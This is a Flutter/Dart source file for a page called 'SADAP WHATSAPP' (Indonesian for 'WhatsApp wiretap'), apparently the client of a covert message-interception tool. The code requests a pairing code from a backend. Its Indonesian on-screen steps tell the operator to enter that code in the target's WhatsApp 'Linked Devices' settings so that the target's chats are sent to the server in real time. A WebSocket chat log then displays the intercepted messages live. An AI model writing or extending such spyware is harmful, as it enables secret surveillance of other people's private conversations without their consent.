import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:web_socket_channel/web_socket_channel.dart';
import 'api_config.dart';

// ─── SADAP WHATSAPP PAGE ─────────────────────────────────────────────────────
class SadapWhatsappPage extends StatefulWidget {
  final String sessionKey;
  final String username;
  const SadapWhatsappPage({Key? key, required this.sessionKey, required this.username}) : super(key: key);
  @override State<SadapWhatsappPage> createState() => _SadapWhatsappPageState();
}

class _SadapWhatsappPageState extends State<SadapWhatsappPage> with TickerProviderStateMixin {
  // ─── State ─────────────────────────────────────────────────────────────────
  int _tab = 0; // 0=pairing, 1=chat log
  String? _pairingCode;
  bool _pairingLoading = false;
  bool _paired = false;
  String? _pairedNumber;
  String? _qrData;
  List<Map<String, dynamic>> _chatLog = [];
  bool _chatLoading = false;
  WebSocketChannel? _wsChannel;
  StreamSubscription? _wsSub;
  Timer? _pollTimer;

  late AnimationController _pulseCtrl;
  late AnimationController _scanCtrl;
  late Animation<double> _scanAnim;

  // Ubuntu pairing method: request 8-digit pairing code
  Future<void> _requestPairingCode() async {
    setState(() { _pairingLoading = true; _pairingCode = null; });
    try {
      final res = await http.post(
        Uri.parse('$baseUrl/sadap/request-pairing'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'key': widget.sessionKey, 'method': 'ubuntu'}),
      ).timeout(const Duration(seconds: 15));
      if (res.statusCode == 200) {
        final d = jsonDecode(res.body);
        if (d['success'] == true) {
          setState(() {
            _pairingCode = d['code'] ?? '--------';
            _qrData = d['qr'];
          });
          _startPairingPoll();
        } else {
          _showSnack('Gagal: ${d['message'] ?? 'Server error'}', isError: true);
        }
      }
    } catch (e) {
      _showSnack('Timeout / koneksi error', isError: true);
    }
    if (mounted) setState(() => _pairingLoading = false);
  }

  void _startPairingPoll() {
    _pollTimer?.cancel();
    _pollTimer = Timer.periodic(const Duration(seconds: 3), (_) async {
      try {
        final res = await http.get(Uri.parse(
          '$baseUrl/sadap/status?key=${widget.sessionKey}',
        )).timeout(const Duration(seconds: 5));
        if (res.statusCode == 200) {
          final d = jsonDecode(res.body);
          if (d['paired'] == true && mounted) {
            setState(() {
              _paired = true;
              _pairedNumber = d['number'] ?? 'Unknown';
            });
            _pollTimer?.cancel();
            _connectChatWS();
          }
        }
      } catch (_) {}
    });
  }

  void _connectChatWS() {
    try {
      final wsUrl = baseUrl.replaceFirst('http', 'ws');
      _wsChannel = WebSocketChannel.connect(
        Uri.parse('$wsUrl/sadap/chat-stream?key=${widget.sessionKey}'),
      );
      _wsSub = _wsChannel!.stream.listen((raw) {
        try {
          final d = jsonDecode(raw);
          if (d['type'] == 'message' && mounted) {
            setState(() {
              _chatLog.insert(0, {
                'from': d['from'] ?? 'Unknown',
                'body': d['body'] ?? '',
                'time': d['time'] ?? DateTime.now().toIso8601String(),
                'isMe': d['fromMe'] == true,
              });
              if (_chatLog.length > 200) _chatLog.removeLast();
            });
          }
        } catch (_) {}
      });
    } catch (_) {
      // Fallback ke HTTP poll
      _pollChats();
    }
  }

  Future<void> _pollChats() async {
    if (_chatLoading) return;
    setState(() => _chatLoading = true);
    try {
      final res = await http.get(Uri.parse(
        '$baseUrl/sadap/chats?key=${widget.sessionKey}',
      )).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        final d = jsonDecode(res.body);
        final msgs = List<Map<String, dynamic>>.from(d['messages'] ?? []);
        if (mounted) setState(() => _chatLog = msgs);
      }
    } catch (_) {}
    if (mounted) setState(() => _chatLoading = false);
  }

  void _disconnect() async {
    _pollTimer?.cancel();
    _wsSub?.cancel();
    _wsChannel?.sink.close();
    try {
      await http.post(Uri.parse('$baseUrl/sadap/disconnect'),
        body: jsonEncode({'key': widget.sessionKey}),
        headers: {'Content-Type': 'application/json'},
      );
    } catch (_) {}
    if (mounted) setState(() { _paired = false; _pairingCode = null; _chatLog = []; _pairedNumber = null; });
  }

  void _showSnack(String msg, {bool isError = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(msg, style: const TextStyle(fontFamily: 'ShareTechMono')),
      backgroundColor: isError ? const Color(0xFFEF4444) : const Color(0xFF22C55E),
    ));
  }

  @override
  void initState() {
    super.initState();
    _pulseCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 1200))..repeat(reverse: true);
    _scanCtrl = AnimationController(vsync: this, duration: const Duration(seconds: 2))..repeat();
    _scanAnim = Tween<double>(begin: 0, end: 1).animate(_scanCtrl);
  }

  @override
  void dispose() {
    _pulseCtrl.dispose();
    _scanCtrl.dispose();
    _pollTimer?.cancel();
    _wsSub?.cancel();
    _wsChannel?.sink.close();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0E1A),
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        flexibleSpace: Container(
          decoration: const BoxDecoration(
            gradient: LinearGradient(
              colors: [Color(0xFF0A0E1A), Color(0xFF0F2040)],
              begin: Alignment.topLeft, end: Alignment.bottomRight,
            ),
          ),
        ),
        title: const Text('SADAP WHATSAPP',
          style: TextStyle(color: Color(0xFF25D366), fontFamily: 'Orbitron',
            fontWeight: FontWeight.w900, fontSize: 14, letterSpacing: 2),
        ),
        centerTitle: true,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new_rounded, color: Colors.white70),
          onPressed: () => Navigator.pop(context),
        ),
        actions: [
          if (_paired)
            IconButton(
              icon: const Icon(Icons.logout_rounded, color: Color(0xFFEF4444)),
              onPressed: _disconnect,
            ),
        ],
        bottom: TabBar(
          onTap: (i) => setState(() => _tab = i),
          isScrollable: false,
          indicatorColor: const Color(0xFF25D366),
          labelColor: const Color(0xFF25D366),
          unselectedLabelColor: Colors.white38,
          labelStyle: const TextStyle(fontFamily: 'Orbitron', fontSize: 11, fontWeight: FontWeight.bold),
          tabs: const [
            Tab(text: 'PAIRING'),
            Tab(text: 'CHAT LOG'),
          ],
        ),
      ),
      body: IndexedStack(
        index: _tab,
        children: [
          _buildPairingTab(),
          _buildChatLogTab(),
        ],
      ),
    );
  }

  // ─── PAIRING TAB ─────────────────────────────────────────────────────────
  Widget _buildPairingTab() {
    if (_paired) return _buildPairedStatus();
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(children: [
        // Header card
        Container(
          padding: const EdgeInsets.all(20),
          decoration: BoxDecoration(
            gradient: const LinearGradient(
              colors: [Color(0xFF128C7E), Color(0xFF075E54)],
              begin: Alignment.topLeft, end: Alignment.bottomRight,
            ),
            borderRadius: BorderRadius.circular(20),
            boxShadow: [BoxShadow(color: const Color(0xFF25D366).withOpacity(0.3), blurRadius: 20, offset: const Offset(0, 8))],
          ),
          child: Column(children: [
            const Icon(Icons.chat_bubble_rounded, color: Colors.white, size: 48),
            const SizedBox(height: 12),
            const Text('SADAP WHATSAPP', style: TextStyle(
              color: Colors.white, fontFamily: 'Orbitron', fontWeight: FontWeight.w900, fontSize: 16, letterSpacing: 2,
            )),
            const SizedBox(height: 6),
            const Text('Metode Ubuntu — Pairing Code', style: TextStyle(
              color: Colors.white70, fontFamily: 'ShareTechMono', fontSize: 12,
            )),
          ]),
        ),
        const SizedBox(height: 24),

        // How it works
        Container(
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: const Color(0xFF0F1A2E),
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: const Color(0xFF25D366).withOpacity(0.3)),
          ),
          child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
            const Text('CARA KERJA:', style: TextStyle(
              color: Color(0xFF25D366), fontFamily: 'Orbitron', fontSize: 11, fontWeight: FontWeight.bold, letterSpacing: 1,
            )),
            const SizedBox(height: 12),
            ...[
              '1. Klik tombol REQUEST CODE di bawah',
              '2. Kode 8 digit muncul di layar ini',
              '3. Buka WhatsApp target → Settings → Linked Devices',
              '4. Pilih "Link with phone number" → masukkan kode',
              '5. Chat target otomatis dikirim ke server secara real-time',
            ].map((s) => Padding(
              padding: const EdgeInsets.only(bottom: 6),
              child: Text(s, style: const TextStyle(color: Colors.white70, fontFamily: 'ShareTechMono', fontSize: 11, height: 1.4)),
            )),
          ]),
        ),
        const SizedBox(height: 24),

        // Pairing code display
        if (_pairingCode != null) ...[
          Container(
            padding: const EdgeInsets.all(24),
            decoration: BoxDecoration(
              color: const Color(0xFF0F1A2E),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: const Color(0xFF25D366), width: 2),
              boxShadow: [BoxShadow(color: const Color(0xFF25D366).withOpacity(0.2), blurRadius: 20)],
            ),
            child: Column(children: [
              const Text('PAIRING CODE', style: TextStyle(
                color: Color(0xFF25D366), fontFamily: 'Orbitron', fontSize: 11, letterSpacing: 2,
              )),
              const SizedBox(height: 16),
              // 8-digit code display
              Row(
                mainAxisAlignment: MainAxisAlignment.center,
                children: _pairingCode!.padRight(8, '-').characters.toList().asMap().entries.map((e) {
                  final i = e.key;
                  return Row(mainAxisSize: MainAxisSize.min, children: [
                    Container(
                      width: 36, height: 44,
                      margin: EdgeInsets.only(right: i == 3 ? 0 : 4),
                      decoration: BoxDecoration(
                        color: const Color(0xFF1A2B4A),
                        borderRadius: BorderRadius.circular(8),
                        border: Border.all(color: const Color(0xFF25D366).withOpacity(0.5)),
                      ),
                      child: Center(child: Text(e.value, style: const TextStyle(
                        color: Color(0xFF25D366), fontFamily: 'Orbitron', fontSize: 20, fontWeight: FontWeight.w900,
                      ))),
                    ),
                    if (i == 3) Container(width: 12, height: 2, margin: const EdgeInsets.symmetric(horizontal: 4),
                      color: const Color(0xFF25D366).withOpacity(0.5)),
                  ]);
                }).toList(),
              ),
              const SizedBox(height: 16),
              // Copy button
              GestureDetector(
                onTap: () {
                  Clipboard.setData(ClipboardData(text: _pairingCode!));
                  _showSnack('Kode disalin!');
                },
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                  decoration: BoxDecoration(
                    color: const Color(0xFF25D366).withOpacity(0.15),
                    borderRadius: BorderRadius.circular(10),
                    border: Border.all(color: const Color(0xFF25D366).withOpacity(0.4)),
                  ),
                  child: const Row(mainAxisSize: MainAxisSize.min, children: [
                    Icon(Icons.copy_rounded, color: Color(0xFF25D366), size: 16),
                    SizedBox(width: 8),
                    Text('SALIN KODE', style: TextStyle(color: Color(0xFF25D366), fontFamily: 'Orbitron', fontSize: 10, fontWeight: FontWeight.bold)),
                  ]),
                ),
              ),
              const SizedBox(height: 12),
              // Waiting indicator
              AnimatedBuilder(
                animation: _pulseCtrl,
                builder: (_, __) => Container(
                  padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
                  decoration: BoxDecoration(
                    color: Colors.orange.withOpacity(0.05 + _pulseCtrl.value * 0.1),
                    borderRadius: BorderRadius.circular(8),
                  ),
                  child: const Row(mainAxisSize: MainAxisSize.min, children: [
                    SizedBox(width: 14, height: 14, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.orange)),
                    SizedBox(width: 8),
                    Text('Menunggu target memasukkan kode...', style: TextStyle(color: Colors.orange, fontFamily: 'ShareTechMono', fontSize: 11)),
                  ]),
                ),
              ),
            ]),
          ),
          const SizedBox(height: 16),
        ],

        // Request button
        AnimatedBuilder(
          animation: _pulseCtrl,
          builder: (_, __) => GestureDetector(
            onTap: _pairingLoading ? null : _requestPairingCode,
            child: Container(
              height: 60,
              decoration: BoxDecoration(
                gradient: const LinearGradient(colors: [Color(0xFF128C7E), Color(0xFF25D366)]),
                borderRadius: BorderRadius.circular(18),
                boxShadow: [BoxShadow(
                  color: const Color(0xFF25D366).withOpacity(0.2 + _pulseCtrl.value * 0.3),
                  blurRadius: 20,
                )],
              ),
              child: Center(child: _pairingLoading
                ? const SizedBox(width: 24, height: 24, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2.5))
                : const Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                    Icon(Icons.key_rounded, color: Colors.white, size: 20),
                    SizedBox(width: 10),
                    Text('REQUEST PAIRING CODE', style: TextStyle(
                      color: Colors.white, fontFamily: 'Orbitron', fontSize: 13, fontWeight: FontWeight.w900, letterSpacing: 1,
                    )),
                  ]),
              ),
            ),
          ),
        ),
      ]),
    );
  }

  Widget _buildPairedStatus() {
    return Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
      Container(
        width: 100, height: 100,
        decoration: const BoxDecoration(
          shape: BoxShape.circle,
          color: Color(0xFF25D366),
        ),
        child: const Icon(Icons.check_rounded, color: Colors.white, size: 54),
      ),
      const SizedBox(height: 20),
      const Text('TERHUBUNG!', style: TextStyle(
        color: Color(0xFF25D366), fontFamily: 'Orbitron', fontSize: 18, fontWeight: FontWeight.w900, letterSpacing: 2,
      )),
      const SizedBox(height: 8),
      Text(_pairedNumber ?? 'Unknown', style: const TextStyle(
        color: Colors.white60, fontFamily: 'ShareTechMono', fontSize: 14,
      )),
      const SizedBox(height: 24),
      const Text('Chat masuk secara real-time ke bawah', style: TextStyle(color: Colors.white38, fontFamily: 'ShareTechMono', fontSize: 11)),
      const SizedBox(height: 20),
      GestureDetector(
        onTap: () => setState(() => _tab = 1),
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
          decoration: BoxDecoration(
            color: const Color(0xFF25D366),
            borderRadius: BorderRadius.circular(14),
          ),
          child: const Text('LIHAT CHAT LOG', style: TextStyle(
            color: Colors.white, fontFamily: 'Orbitron', fontSize: 12, fontWeight: FontWeight.bold,
          )),
        ),
      ),
    ]));
  }

  // ─── CHAT LOG TAB ─────────────────────────────────────────────────────────
  Widget _buildChatLogTab() {
    if (!_paired) {
      return Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
        const Icon(Icons.lock_rounded, color: Colors.white24, size: 64),
        const SizedBox(height: 16),
        const Text('Belum terpair', style: TextStyle(color: Colors.white38, fontFamily: 'Orbitron', fontSize: 14)),
        const SizedBox(height: 8),
        const Text('Lakukan pairing terlebih dahulu', style: TextStyle(color: Colors.white24, fontSize: 12)),
      ]));
    }
    return Column(children: [
      // Live indicator
      Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
        color: const Color(0xFF0A1520),
        child: Row(children: [
          AnimatedBuilder(
            animation: _pulseCtrl,
            builder: (_, __) => Container(
              width: 8, height: 8,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: Color.lerp(const Color(0xFF25D366), Colors.white, _pulseCtrl.value * 0.3)!,
              ),
            ),
          ),
          const SizedBox(width: 8),
          const Text('LIVE — Chat masuk real-time', style: TextStyle(
            color: Color(0xFF25D366), fontFamily: 'ShareTechMono', fontSize: 11,
          )),
          const Spacer(),
          GestureDetector(
            onTap: _pollChats,
            child: const Icon(Icons.refresh_rounded, color: Colors.white38, size: 18),
          ),
        ]),
      ),
      Expanded(
        child: _chatLog.isEmpty
          ? Center(child: _chatLoading
              ? const CircularProgressIndicator(color: Color(0xFF25D366))
              : const Text('Belum ada pesan masuk', style: TextStyle(color: Colors.white38, fontFamily: 'ShareTechMono')))
          : ListView.builder(
              padding: const EdgeInsets.symmetric(vertical: 8),
              itemCount: _chatLog.length,
              itemBuilder: (ctx, i) => _buildChatBubble(_chatLog[i]),
            ),
      ),
    ]);
  }

  Widget _buildChatBubble(Map<String, dynamic> msg) {
    final isMe = msg['isMe'] == true;
    final from = msg['from'] ?? 'Unknown';
    final body = msg['body'] ?? '';
    final time = msg['time'] ?? '';
    return Align(
      alignment: isMe ? Alignment.centerRight : Alignment.centerLeft,
      child: Container(
        margin: EdgeInsets.only(
          left: isMe ? 50 : 12, right: isMe ? 12 : 50, bottom: 6,
        ),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
        decoration: BoxDecoration(
          color: isMe ? const Color(0xFF005C4B) : const Color(0xFF1F2C34),
          borderRadius: BorderRadius.only(
            topLeft: const Radius.circular(14),
            topRight: const Radius.circular(14),
            bottomLeft: Radius.circular(isMe ? 14 : 4),
            bottomRight: Radius.circular(isMe ? 4 : 14),
          ),
        ),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          if (!isMe) Text(from, style: const TextStyle(color: Color(0xFF25D366), fontFamily: 'ShareTechMono', fontSize: 10, fontWeight: FontWeight.bold)),
          if (!isMe) const SizedBox(height: 4),
          Text(body, style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono', fontSize: 13, height: 1.4)),
          const SizedBox(height: 4),
          Text(time.length > 15 ? time.substring(11, 16) : time,
            style: const TextStyle(color: Colors.white38, fontSize: 9)),
        ]),
      ),
    );
  }
}
